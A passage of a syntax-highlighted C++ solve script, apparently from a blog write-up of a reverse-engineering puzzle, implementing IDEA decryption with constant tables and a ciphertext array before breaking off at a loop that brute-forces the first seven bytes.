class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;16&gt; code;</span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;128&gt; key;</span><br><span class="line"></span><br><span class="line">bitset&lt;16&gt; sub_key[<span class="number">52</span>];</span><br><span class="line">bitset&lt;16&gt; inv_sub_key[<span class="number">52</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">XOR</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> code_1 ^ code_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">Plus</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp += code_1[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i) + code_2[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    tmp %= <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">invPlus</span><span class="params">(code code_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        tmp += code_in[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    tmp = <span class="number">65536</span> - tmp;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">Times</span><span class="params">(code code_1, code code_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tmp_1 = <span class="number">0</span>, tmp_2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_1 += code_1[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">        tmp_2 += code_2[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmp_1 == <span class="number">0</span>)</span><br><span class="line">        tmp_1 = <span class="number">65536</span>;</span><br><span class="line">    <span class="keyword">if</span> (tmp_2 == <span class="number">0</span>)</span><br><span class="line">        tmp_2 = <span class="number">65536</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tmp = (tmp_1 * tmp_2) % <span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(tmp == <span class="number">65536</span> ? <span class="number">0</span> : tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Exgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b)</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">Exgcd</span>(b, a % b, y, x), y -= a / b * x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">code <span class="title">invTimes</span><span class="params">(code code_in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        tmp += code_in[i] * <span class="built_in">pow</span>(<span class="number">2</span>, i);</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">65537</span>;</span><br><span class="line">    <span class="built_in">Exgcd</span>(tmp, p, x, y);</span><br><span class="line">    x = (x % p + p) % p;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bitset</span>&lt;<span class="number">16</span>&gt;(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">subkeys_get</span><span class="params">(code keys_input[<span class="number">8</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    key keys;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            keys[j + <span class="number">16</span> * i] = keys_input[<span class="number">7</span> - i][j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            sub_key[i][<span class="number">15</span> - j] = keys[<span class="number">127</span> - (j + <span class="number">16</span> * i)];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key tmp_keys = keys &gt;&gt; <span class="number">103</span>;</span><br><span class="line">        keys = (keys &lt;&lt; <span class="number">25</span>) | tmp_keys;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = (<span class="number">8</span> + <span class="number">8</span> * i); j &lt; (<span class="number">8</span> * (i + <span class="number">2</span>)); j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">                sub_key[j][<span class="number">15</span> - k] = keys[<span class="number">127</span> - (k + <span class="number">16</span> * (j - <span class="number">8</span> - <span class="number">8</span> * i))];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key tmp_keys = keys &gt;&gt; <span class="number">103</span>;</span><br><span class="line">    keys = (keys &lt;&lt; <span class="number">25</span>) | tmp_keys;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">48</span>; i &lt; <span class="number">52</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">            sub_key[i][<span class="number">15</span> - j] = keys[<span class="number">127</span> - (j + <span class="number">16</span> * (i - <span class="number">48</span>))];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inv_subkeys_get</span><span class="params">(code sub_key[<span class="number">52</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        inv_sub_key[i] = <span class="built_in">invTimes</span>(sub_key[<span class="number">48</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">1</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">50</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">2</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">49</span> - i]);</span><br><span class="line">        inv_sub_key[i + <span class="number">3</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">51</span> - i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        inv_sub_key[i + <span class="number">4</span>] = sub_key[<span class="number">46</span> - i];</span><br><span class="line">        inv_sub_key[i + <span class="number">5</span>] = sub_key[<span class="number">47</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    inv_sub_key[<span class="number">0</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">48</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">1</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">49</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">2</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">50</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">3</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">51</span>]);</span><br><span class="line"></span><br><span class="line">    inv_sub_key[<span class="number">48</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">0</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">49</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">1</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">50</span>] = <span class="built_in">invPlus</span>(sub_key[<span class="number">2</span>]);</span><br><span class="line">    inv_sub_key[<span class="number">51</span>] = <span class="built_in">invTimes</span>(sub_key[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">bitset&lt;64&gt; <span class="title">dencrypt</span><span class="params">(bitset&lt;<span class="number">64</span>&gt; cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bitset&lt;16&gt; I_1, I_2, I_3, I_4;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        I_1[<span class="number">15</span> - i] = cipher[<span class="number">63</span> - i];</span><br><span class="line">        I_2[<span class="number">15</span> - i] = cipher[<span class="number">47</span> - i];</span><br><span class="line">        I_3[<span class="number">15</span> - i] = cipher[<span class="number">31</span> - i];</span><br><span class="line">        I_4[i] = cipher[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bitset&lt;16&gt; tmp_1 = <span class="built_in">Times</span>(inv_sub_key[i], I_1);</span><br><span class="line">        bitset&lt;16&gt; tmp_2 = <span class="built_in">Plus</span>(inv_sub_key[i + <span class="number">1</span>], I_2);</span><br><span class="line">        bitset&lt;16&gt; tmp_3 = <span class="built_in">Plus</span>(inv_sub_key[i + <span class="number">2</span>], I_3);</span><br><span class="line">        bitset&lt;16&gt; tmp_4 = <span class="built_in">Times</span>(inv_sub_key[i + <span class="number">3</span>], I_4);</span><br><span class="line">        bitset&lt;16&gt; tmp_5 = <span class="built_in">XOR</span>(tmp_1, tmp_3);</span><br><span class="line">        bitset&lt;16&gt; tmp_6 = <span class="built_in">XOR</span>(tmp_2, tmp_4);</span><br><span class="line">        bitset&lt;16&gt; tmp_7 = <span class="built_in">Times</span>(inv_sub_key[i + <span class="number">4</span>], tmp_5);</span><br><span class="line">        bitset&lt;16&gt; tmp_8 = <span class="built_in">Plus</span>(tmp_6, tmp_7);</span><br><span class="line">        bitset&lt;16&gt; tmp_9 = <span class="built_in">Times</span>(tmp_8, inv_sub_key[i + <span class="number">5</span>]);</span><br><span class="line">        bitset&lt;16&gt; tmp_10 = <span class="built_in">Plus</span>(tmp_7, tmp_9);</span><br><span class="line">        I_1 = <span class="built_in">XOR</span>(tmp_1, tmp_9);</span><br><span class="line">        I_2 = <span class="built_in">XOR</span>(tmp_3, tmp_9);</span><br><span class="line">        I_3 = <span class="built_in">XOR</span>(tmp_2, tmp_10);</span><br><span class="line">        I_4 = <span class="built_in">XOR</span>(tmp_4, tmp_10);</span><br><span class="line">    &#125;</span><br><span class="line">    bitset&lt;16&gt; Y_1 = <span class="built_in">Times</span>(I_1, inv_sub_key[<span class="number">48</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_2 = <span class="built_in">Plus</span>(I_3, inv_sub_key[<span class="number">49</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_3 = <span class="built_in">Plus</span>(I_2, inv_sub_key[<span class="number">50</span>]);</span><br><span class="line">    bitset&lt;16&gt; Y_4 = <span class="built_in">Times</span>(I_4, inv_sub_key[<span class="number">51</span>]);</span><br><span class="line"></span><br><span class="line">    bitset&lt;64&gt; plaint;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        plaint[i] = Y_4[i];</span><br><span class="line">        plaint[i + <span class="number">16</span>] = Y_3[i];</span><br><span class="line">        plaint[i + <span class="number">32</span>] = Y_2[i];</span><br><span class="line">        plaint[i + <span class="number">48</span>] = Y_1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> plaint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> box1[] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0xC0BA6CAC</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x9ABFB3B7</span>, <span class="number">0xB40BBE36</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line">        <span class="number">0xEE0E612D</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB3667A2F</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE963A534</span>, <span class="number">0x29D9C998</span>, <span class="number">0x076DC419</span>, <span class="number">0xC7D7A8B5</span>,</span><br><span class="line">        <span class="number">0x5D681B02</span>, <span class="number">0x9DD277AE</span>, <span class="number">0xBDBDF21D</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xE7B82D06</span>, <span class="number">0x270241AA</span>, <span class="number">0x09B64C2B</span>, <span class="number">0xC90C2087</span>,</span><br><span class="line">        <span class="number">0x53B39330</span>, <span class="number">0x9309FF9C</span>, <span class="number">0x0EDB8832</span>, <span class="number">0xCE61E49E</span>, <span class="number">0x54DE5729</span>, <span class="number">0x94643B85</span>, <span class="number">0xBAD03604</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line">        <span class="number">0xE0D5E91F</span>, <span class="number">0x206F85B3</span>, <span class="number">0xA00AE279</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xFA0F3D62</span>, <span class="number">0x3AB551CE</span>, <span class="number">0x14015C4F</span>, <span class="number">0xD4BB30E3</span>,</span><br><span class="line">        <span class="number">0x4E048354</span>, <span class="number">0x8EBEEFF8</span>, <span class="number">0x136C9856</span>, <span class="number">0xD3D6F4FA</span>, <span class="number">0x4969474D</span>, <span class="number">0x89D32BE1</span>, <span class="number">0xA7672660</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line">        <span class="number">0xFD62F97B</span>, <span class="number">0x3DD895D7</span>, <span class="number">0x1DB71064</span>, <span class="number">0xDD0D7CC8</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x8708A3D3</span>, <span class="number">0xA9BCAE52</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line">        <span class="number">0xF3B97149</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAED16A4B</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xF4D4B550</span>, <span class="number">0x346ED9FC</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0xDA60B8D1</span>,</span><br><span class="line">        <span class="number">0x40DF0B66</span>, <span class="number">0x806567CA</span>, <span class="number">0x9B64C2B1</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0xC1611DAA</span>, <span class="number">0x01DB7106</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0xEFD5102B</span>,</span><br><span class="line">        <span class="number">0x756AA39C</span>, <span class="number">0xB5D0CF30</span>, <span class="number">0x2802B89E</span>, <span class="number">0xE8B8D432</span>, <span class="number">0x72076785</span>, <span class="number">0xB2BD0B29</span>, <span class="number">0x9C0906A8</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line">        <span class="number">0xC60CD9B3</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x26D930AC</span>, <span class="number">0xE6635C00</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0xBC66831B</span>, <span class="number">0x92D28E9A</span>, <span class="number">0x5268E236</span>,</span><br><span class="line">        <span class="number">0xC8D75181</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x95BF4A83</span>, <span class="number">0x5505262F</span>, <span class="number">0xCFBA9598</span>, <span class="number">0x0F00F934</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0xE10E9819</span>,</span><br><span class="line">        <span class="number">0x7BB12BAE</span>, <span class="number">0xBB0B4702</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0xFBD44C64</span>, <span class="number">0x616BFFD3</span>, <span class="number">0xA1D1937F</span>, <span class="number">0x8F659EFE</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line">        <span class="number">0xD56041E5</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x88085AE7</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD20D85FC</span>, <span class="number">0x12B7E950</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0xFCB9887D</span>,</span><br><span class="line">        <span class="number">0x66063BCA</span>, <span class="number">0xA6BC5766</span>, <span class="number">0x86D3D2D5</span>, <span class="number">0x4669BE79</span>, <span class="number">0xDCD60DCE</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x32D86CE3</span>, <span class="number">0xF262004F</span>,</span><br><span class="line">        <span class="number">0x68DDB3F8</span>, <span class="number">0xA867DF54</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0xF50FC456</span>, <span class="number">0x6FB077E1</span>, <span class="number">0xAF0A1B4D</span>, <span class="number">0x81BE16CC</span>, <span class="number">0x41047A60</span>,</span><br><span class="line">        <span class="number">0xDBBBC9D7</span>, <span class="number">0x1B01A57B</span>, <span class="number">0xEDB88321</span>, <span class="number">0x2D02EF8D</span>, <span class="number">0xB7BD5C3A</span>, <span class="number">0x77073096</span>, <span class="number">0x59B33D17</span>, <span class="number">0x990951BB</span>,</span><br><span class="line">        <span class="number">0x03B6E20C</span>, <span class="number">0xC30C8EA0</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x9E6495A2</span>, <span class="number">0x04DB2615</span>, <span class="number">0xC4614AB9</span>, <span class="number">0xEAD54738</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line">        <span class="number">0xB0D09823</span>, <span class="number">0x706AF48F</span>, <span class="number">0x5005713C</span>, <span class="number">0x90BF1D90</span>, <span class="number">0x0A00AE27</span>, <span class="number">0xCABAC28B</span>, <span class="number">0xE40ECF0A</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line">        <span class="number">0xBE0B1011</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE3630B13</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB966D408</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0x5768B525</span>, <span class="number">0x97D2D989</span>,</span><br><span class="line">        <span class="number">0x0D6D6A3E</span>, <span class="number">0xCDD70692</span>, <span class="number">0x4DB26158</span>, <span class="number">0x8D080DF4</span>, <span class="number">0x17B7BE43</span>, <span class="number">0xD70DD2EF</span>, <span class="number">0xF9B9DF6E</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line">        <span class="number">0xA3BC0075</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFED41B77</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xA4D1C46C</span>, <span class="number">0x646BA8C0</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x8A65C9ED</span>,</span><br><span class="line">        <span class="number">0x10DA7A5A</span>, <span class="number">0xD06016F6</span>, <span class="number">0xF00F9345</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xAA0A4C5E</span>, <span class="number">0x6AB020F2</span>, <span class="number">0x44042D73</span>, <span class="number">0x84BE41DF</span>,</span><br><span class="line">        <span class="number">0x1E01F268</span>, <span class="number">0xDEBB9EC4</span>, <span class="number">0x4369E96A</span>, <span class="number">0x83D385C6</span>, <span class="number">0x196C3671</span>, <span class="number">0xD9D65ADD</span>, <span class="number">0xF762575C</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line">        <span class="number">0xAD678847</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0x76DC4190</span>, <span class="number">0xB6662D3C</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0xEC63F227</span>, <span class="number">0xC2D7FFA6</span>, <span class="number">0x026D930A</span>,</span><br><span class="line">        <span class="number">0x98D220BD</span>, <span class="number">0x58684C11</span>, <span class="number">0xC5BA3BBF</span>, <span class="number">0x05005713</span>, <span class="number">0x9FBFE4A4</span>, <span class="number">0x5F058808</span>, <span class="number">0x71B18589</span>, <span class="number">0xB10BE925</span>,</span><br><span class="line">        <span class="number">0x2BB45A92</span>, <span class="number">0xEB0E363E</span>, <span class="number">0xCB61B38D</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x91646C96</span>, <span class="number">0x51DE003A</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0xBFD06117</span>,</span><br><span class="line">        <span class="number">0x256FD2A0</span>, <span class="number">0xE5D5BE0C</span>, <span class="number">0x7807C9A2</span>, <span class="number">0xB8BDA50E</span>, <span class="number">0x220216B9</span>, <span class="number">0xE2B87A15</span>, <span class="number">0xCC0C7794</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line">        <span class="number">0x9609A88F</span>, <span class="number">0x56B3C423</span>, <span class="number">0xD6D6A3E9</span>, <span class="number">0x166CCF45</span>, <span class="number">0x8CD37CF2</span>, <span class="number">0x4C69105E</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0xA2677173</span>,</span><br><span class="line">        <span class="number">0x38D8C2C4</span>, <span class="number">0xF862AE68</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0xA50AB56A</span>, <span class="number">0x3FB506DD</span>, <span class="number">0xFF0F6A71</span>, <span class="number">0xD1BB67F0</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line">        <span class="number">0x8BBEB8EB</span>, <span class="number">0x4B04D447</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0xABD13D58</span>, <span class="number">0x316E8EEF</span>, <span class="number">0xF1D4E243</span>, <span class="number">0xDF60EFC2</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line">        <span class="number">0x856530D9</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xD80D2BDB</span>, <span class="number">0x18B74777</span>, <span class="number">0x8208F4C0</span>, <span class="number">0x42B2986C</span>, <span class="number">0x6C0695ED</span>, <span class="number">0xACBCF941</span>,</span><br><span class="line">        <span class="number">0x36034AF6</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCC00</span>, <span class="number">0x00000100</span>, <span class="number">0x00000000</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>,</span><br><span class="line">        <span class="number">0x00000008</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> enc1[]&#123;</span><br><span class="line">        <span class="number">0x46A95BAD</span>,</span><br><span class="line">        <span class="number">0x1CAC84B6</span>,</span><br><span class="line">        <span class="number">0xA67CB2B2</span>,</span><br><span class="line">        <span class="number">0x32188937</span>,</span><br><span class="line">        <span class="number">0x4872D39F</span>,</span><br><span class="line">        <span class="number">0xF2A2E59B</span>,</span><br><span class="line">        <span class="number">0x011B94D2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 爆破前7字节</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span 